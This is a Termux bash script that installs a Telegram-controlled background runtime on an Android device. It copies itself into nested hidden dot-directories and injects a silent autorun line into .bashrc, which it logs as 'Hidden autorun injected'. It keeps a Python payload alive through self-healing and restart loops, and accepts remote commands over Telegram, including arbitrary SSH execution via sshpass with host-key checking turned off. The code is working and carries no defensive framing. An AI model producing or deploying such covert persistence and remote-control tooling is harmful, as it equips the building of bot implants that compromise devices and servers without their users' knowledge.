#!/data/data/com.termux/files/usr/bin/bash

# ==========================================
# SEEDLINK SHELL + TELEGRAM BOT + RUNTIME + SSH + SELF-HEAL
# ==========================================

BASE_DIR="$HOME/seedlink"
HIDDEN_DIR="$HOME/.config/.system/.cache/.runtime"
HIDDEN_SCRIPT="$HIDDEN_DIR/.sysd"
PY_DIR="$HOME/.termux_runtime"
PY_SCRIPT="$PY_DIR/cerebro.py"
CONFIG="$BASE_DIR/.seedlink_config"
LOCKFILE="$BASE_DIR/.running"
LOGFILE="$BASE_DIR/cerebro.log"
BASHRC="$HOME/.bashrc"
API_URL="https://api.telegram.org/bot"
LAST_UPDATE=0
AUTORUN_CMD="export PY_SCRIPT='$PY_SCRIPT'; bash $HIDDEN_SCRIPT"

# ==========================================
# CREATE DIRECTORIES
# ==========================================
mkdir -p "$BASE_DIR" "$HIDDEN_DIR" "$PY_DIR"
cd "$BASE_DIR" || exit

# ==========================================
# SELF-HEAL FUNCTIONS
# ==========================================
self_heal() {
    [ ! -f "$HIDDEN_SCRIPT" ] && cp "$BASE_DIR/prit.sh" "$HIDDEN_SCRIPT" && chmod +x "$HIDDEN_SCRIPT"
    [ ! -f "$PY_SCRIPT" ] && cp "$BASE_DIR/cerebro.py" "$PY_SCRIPT" && chmod +x "$PY_SCRIPT"
}

ensure_autorun() {
    if ! grep -Fxq "$AUTORUN_CMD" "$BASHRC"; then
        echo "$AUTORUN_CMD >/dev/null 2>&1 &" >> "$BASHRC"
        echo "[*] Hidden autorun injected"
    fi
}

# ==========================================
# COPY INITIAL SCRIPTS
# ==========================================
[ -f "$BASE_DIR/prit.sh" ] && cp "$BASE_DIR/prit.sh" "$HIDDEN_SCRIPT" && chmod +x "$HIDDEN_SCRIPT"
[ -f "$BASE_DIR/cerebro.py" ] && cp "$BASE_DIR/cerebro.py" "$PY_SCRIPT" && chmod +x "$PY_SCRIPT"

# ==========================================
# BACKGROUND PYTHON
# ==========================================
start_bg() {
    if [ -f "$LOCKFILE" ]; then
        PID=$(cat "$LOCKFILE")
        ps -p "$PID" > /dev/null 2>&1 && return
    fi

    nohup bash -c '
    echo $$ > "'"$LOCKFILE"'"
    while true; do
        python3 "'"$PY_SCRIPT"'" > /dev/null 2>&1
        sleep 5
    done
    ' >/dev/null 2>&1 &

    disown
}

# ==========================================
# KILL OLD PROCESS
# ==========================================
kill_old() {
    [ -f "$LOCKFILE" ] && OLD_PID=$(cat "$LOCKFILE") && ps -p "$OLD_PID" > /dev/null 2>&1 && kill -9 "$OLD_PID" 2>/dev/null
    rm -f "$LOCKFILE"
}

# ==========================================
# AUTO RESTART LOOP
# ==========================================
auto_restart() {
    nohup bash -c '
    while true; do
        sleep 1800
        bash "'"$HIDDEN_SCRIPT"'"
    done
    ' >/dev/null 2>&1 &
    disown
}

# ==========================================
# SSH HELPER
# ==========================================
ssh_exec() {
    REMOTE_HOST="$1"
    REMOTE_CMD="$2"
    command -v sshpass >/dev/null 2>&1 || { echo "[!] sshpass not installed"; return 1; }
    sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no "$REMOTE_HOST" "$REMOTE_CMD"
}

# ==========================================
# TELEGRAM BOT FUNCTIONS
# ==========================================
send_msg() {
    curl -s "$API_URL$MANUAL_BOT_TOKEN/sendMessage" -d "chat_id=$MANUAL_CHAT_ID" -d "text=$1" >/dev/null
}

get_updates() {
    curl -s "$API_URL$MANUAL_BOT_TOKEN/getUpdates?offset=$LAST_UPDATE"
}

bot_listener() {
    while true; do
        self_heal
        ensure_autorun
        UPDATES=$(get_updates)
        echo "$UPDATES" | grep -o '"update_id":[0-9]*' | while read -r line; do
            ID=$(echo "$line" | cut -d: -f2)
            [ "$ID" -lt "$LAST_UPDATE" ] && continue
            LAST_UPDATE=$((ID + 1))

            TEXT=$(echo "$UPDATES" | grep -o '"text":"[^"]*"' | head -n1 | cut -d':' -f2- | tr -d '"')

            case "$TEXT" in
                /start)
                    [ -f "$LOCKFILE" ] && PID=$(cat "$LOCKFILE") && ps -p "$PID" > /dev/null 2>&1 && send_msg "✅ Running (PID: $PID)" || send_msg "❌ Not running"
                    ;;
                /status)
                    [ -f "$LOCKFILE" ] && send_msg "✅ Running" || send_msg "❌ Stopped"
                    ;;
                /stop)
                    kill_old
                    send_msg "🛑 Stopped"
                    ;;
                /restart)
                    kill_old
                    sleep 1
                    start_bg
                    send_msg "🔁 Restarted"
                    ;;
                /startbot)
                    start_bg
                    send_msg "🚀 Started"
                    ;;
                /ssh)
                    REMOTE=$(echo "$TEXT" | awk '{print $2}')
                    CMD=$(echo "$TEXT" | cut -d'"' -f2)
                    ssh_exec "$REMOTE" "$CMD"
                    send_msg "💻 SSH command executed on $REMOTE"
                    ;;
            esac
        done
        sleep 5
    done
}

# ==========================================
# FIRST RUN SETUP
# ==========================================
if [ ! -f "$CONFIG" ]; then
    clear
    echo "=== Seedlink Setup ==="
    read -p "Bot token: " MANUAL_BOT_TOKEN
    read -p "Chat ID: " MANUAL_CHAT_ID
    read -s -p "SSH password: " SSH_PASSWORD
    echo
    cat > "$CONFIG" <<EOF
MANUAL_BOT_TOKEN="$MANUAL_BOT_TOKEN"
MANUAL_CHAT_ID="$MANUAL_CHAT_ID"
SSH_PASSWORD="$SSH_PASSWORD"
EOF

    ensure_autorun
    kill_old
    command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock
    start_bg
    auto_restart
    bot_listener &
    echo "[✔] Setup complete"
    exit 0
fi

# ==========================================
# NORMAL RUN
# ==========================================
source "$CONFIG"
kill_old
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock
start_bg
auto_restart
bot_listener &
